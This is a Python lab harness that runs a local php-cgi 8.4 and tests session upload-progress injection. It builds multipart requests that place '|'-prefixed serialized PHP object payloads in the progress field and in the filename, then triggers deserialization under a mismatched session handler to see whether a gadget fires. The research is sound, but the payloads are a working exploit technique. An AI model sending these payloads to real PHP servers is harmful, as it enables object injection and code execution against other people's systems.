#!/usr/bin/env python3
"""Byte-exact multipart tests against php-cgi 8.4.27 (session.upload_progress).
Each call = one fresh CGI process, equivalent to one request."""
import os, subprocess, sys, glob

ROOT = "/tmp/opencode/research/phpsessinj_1792633613"
PHP = ROOT + "/lab/root/usr/bin/php-cgi8.4"
SESS = ROOT + "/labfpm/sess"
WWW = ROOT + "/labfpm/wwwB"
B = "----labboundary7f3a"
MARK = ROOT + "/labfpm/POP_FIRED.txt"

CORE = ["-n", "-d", "session.save_path="+SESS, "-d", "session.upload_progress.enabled=1",
        "-d", "session.upload_progress.cleanup=0", "-d", "session.use_strict_mode=0",
        "-d", "session.use_cookies=1", "-d", "session.gc_probability=0",
        "-d", "display_errors=1", "-d", "error_reporting=E_ALL",
        "-d", "upload_max_filesize=1M", "-d", "post_max_size=2M",
        "-d", "max_file_uploads=2", "-d", "log_errors=1"]

def mp(name=None, value=b"", filename=None):
    d = b'Content-Disposition: form-data; name="' + name.encode() + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + B.encode() + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

def build(sid=None, progress=b"hello", filename=b"a.txt", sid_in_body=False, body_extra=b""):
    out = b""
    if sid and sid_in_body:
        out += mp("PHPSESSID", sid.encode())
    if progress is not None:
        out += mp("PHP_SESSION_UPLOAD_PROGRESS", progress)
    out += mp("f", b"Z", filename=filename)
    out += body_extra
    return out + b"--" + B.encode() + b"--\r\n"

def req(method="POST", sid=None, body=b"", handler="php", script="index.php", query=""):
    env = {"REDIRECT_STATUS": "1", "REQUEST_METHOD": method,
           "SCRIPT_FILENAME": os.path.join(WWW, script),
           "SCRIPT_NAME": "/" + script, "QUERY_STRING": query,
           "SERVER_PROTOCOL": "HTTP/1.1", "GATEWAY_INTERFACE": "CGI/1.1",
           "SERVER_SOFTWARE": "lab", "REMOTE_ADDR": "127.0.0.1"}
    if method == "POST":
        env["CONTENT_TYPE"] = "multipart/form-data; boundary=" + B
        env["CONTENT_LENGTH"] = str(len(body))
    if sid:
        env["HTTP_COOKIE"] = "PHPSESSID=" + sid
    p = subprocess.run([PHP] + CORE + ["-d", "session.serialize_handler="+handler],
                       input=body, capture_output=True, env=env, timeout=30)
    return p.stdout.decode("latin-1"), p.stderr.decode("latin-1")

def show(sid):
    path = os.path.join(SESS, "sess_" + sid)
    if not os.path.exists(path):
        print("   FILE: MISSING"); return None
    raw = open(path, "rb").read()
    print("   FILE: %d bytes" % len(raw))
    print("   RAW : %r" % raw[:500])
    return raw

if __name__ == "__main__":
    t = sys.argv[1]
    if t == "normal":
        sid = "cginormal1"
        o, e = req("POST", sid, build(sid, b"hello"), handler="php")
        print("== php handler, plain key =="); print(o.strip()[:200]); show(sid)
    elif t == "pipe_default":
        sid = "cgipipe1"
        o, e = req("POST", sid, build(sid, b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), handler="php")
        print("== php handler, '|' in progress value =="); print(o.strip()[:300]); show(sid)
    elif t == "pipe_serialize":
        sid = "cgiser1"
        o, e = req("POST", sid, build(sid, b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), handler="php_serialize")
        print("== php_serialize handler, '|' in progress value =="); print(o.strip()[:300]); show(sid)
    elif t == "filename_default":
        sid = "cgifn1"
        o, e = req("POST", sid, build(sid, b"p", filename=b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), handler="php")
        print("== php handler, '|'+object in filename =="); print(o.strip()[:300]); show(sid)
    elif t == "sid_body":
        o, e = req("POST", None, build("cgibody1", b"bodysid", sid_in_body=True), handler="php")
        print("== SID via body field, no cookie =="); print(o.strip()[:300]); show("cgibody1")
    elif t == "trigger":   # read path, fresh process, php handler, app autoloads Evil
        sid = sys.argv[2]
        if os.path.exists(MARK): os.unlink(MARK)
        o, e = req("GET", sid, handler="php")
        print("== trigger GET =="); print(o.strip()[:400])
        print("   POP_FIRED:", open(MARK).read().strip() if os.path.exists(MARK) else "NO")
        print("   stderr:", e.strip()[:300])
    elif t == "trigger_serialize_write_read":
        # control: same handler both sides
        sid = "cgictrl1"
        req("POST", sid, build(sid, b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), handler="php_serialize")
        print("== same-handler control: raw file =="); show(sid)
        if os.path.exists(MARK): os.unlink(MARK)
        o, e = req("GET", sid, handler="php_serialize")
        print(o.strip()[:300]); print("   POP_FIRED:", open(MARK).read().strip() if os.path.exists(MARK) else "NO")
